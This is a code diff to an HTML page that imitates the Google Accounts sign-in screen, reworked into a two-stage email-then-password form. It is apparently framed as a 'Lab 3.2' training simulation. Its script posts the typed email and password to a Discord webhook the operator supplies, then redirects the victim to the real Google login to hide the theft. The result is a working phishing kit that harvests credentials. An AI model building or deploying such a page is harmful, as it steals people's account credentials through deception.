@@ -5,83 +5,79 @@
     <title>Sign in - Google Accounts</title>
     <style>
         body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
+        .card { width: 350px; min-height: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
         img { width: 75px; margin-bottom: 10px; }
         h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
         p { color: #202124; font-size: 16px; margin-bottom: 24px; }
-        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
-        /* Hidden status area for the student's eyes only via Console */
-        #status { display: none; } 
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        input:focus { outline: none; border: 2px solid #1a73e8; }
+        button { width: 88px; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; float: right; margin-top: 30px; }
+        .hidden { display: none; }
+        .user-display { border: 1px solid #dadce0; border-radius: 16px; padding: 5px 15px; display: inline-flex; align-items: center; margin-bottom: 20px; font-size: 14px; }
+        .footer { position: absolute; bottom: 40px; left: 40px; text-align: left; font-size: 14px; color: #1a73e8; font-weight: 500; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="card">
+<div class="card" id="email-stage">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
     <h1>Sign in</h1>
     <p>Use your Google Account</p>
-    
-    <input type="email" id="email" placeholder="Email or phone">
-    <input type="password" id="pass" placeholder="Enter your password">
-    
+    <input type="email" id="email" placeholder="Email or phone" autofocus>
+    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot email?</div>
+    <div class="footer">Create account</div>
+    <button onclick="nextStep()">Next</button>
+</div>
+
+<div class="card hidden" id="password-stage">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h1>Welcome</h1>
+    <div class="user-display" id="display-email"></div>
+    <input type="password" id="pass" placeholder="Enter your password" autofocus>
+    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot password?</div>
     <button onclick="transmit()">Next</button>
-    <div id="status"></div>
 </div>
 
 <script>
-    // GitHub Pages Safety Protocol
     let hook = sessionStorage.getItem('discord_hook');
     if (!hook) {
-        hook = prompt("PASTE YOUR DISCORD WEBHOOK URL HERE:");
+        hook = prompt("ENTER DISCORD WEBHOOK:");
         if (hook) sessionStorage.setItem('discord_hook', hook);
+    }
+
+    function nextStep() {
+        const email = document.getElementById('email').value;
+        if(!email) return;
+        document.getElementById('display-email').innerText = email;
+        document.getElementById('email-stage').classList.add('hidden');
+        document.getElementById('password-stage').classList.remove('hidden');
     }
 
     async function transmit() {
         const e = document.getElementById('email').value;
         const p = document.getElementById('pass').value;
 
-        if (!hook) return; // Silent fail if no hook
-
-        // The Payload: Using separate fields for clean Discord formatting
         const payload = {
-            username: "C2 Exfiltration Bot",
-            avatar_url: "https://cdn-icons-png.flaticon.com/512/6861/6861362.png",
             embeds: [{
-                title: "📬 New Credentials Harvested",
-                color: 16711680, // Red color
+                title: "🎯 Lab 3.2 Target Captured",
+                color: 16711680,
                 fields: [
-                    {
-                        name: "📧 Target Email",
-                        value: `\`\`\`${e || "No input"}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "🔑 Target Password",
-                        value: `|| ${p || "No input"} ||`, // Spoiler tag for stealth
-                        inline: false
-                    }
+                    { name: "User", value: `\`${e}\`` },
+                    { name: "Password", value: `|| ${p} ||` }
                 ],
-                footer: { text: "Source: Lab 3.2 Simulation" },
-                timestamp: new Date()
+                footer: { text: "Protocol: Indirect Injection Simulation" }
             }]
         };
 
         try {
-            // We use the fetch but don't update the UI on success
             await fetch(hook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-
-            // "The Illusion": Just redirect them to the real Google login 
-            // making them think the first attempt just timed out or glitched.
+            // Redirect to actual Google to close the loop
             window.location.href = "https://accounts.google.com/ServiceLogin";
-            
-        } catch (err) {
-            console.error("Exfiltration failed:", err);
-            // Even on error, redirect to avoid suspicion
+        } catch {
             window.location.href = "https://accounts.google.com/ServiceLogin";
         }
     }
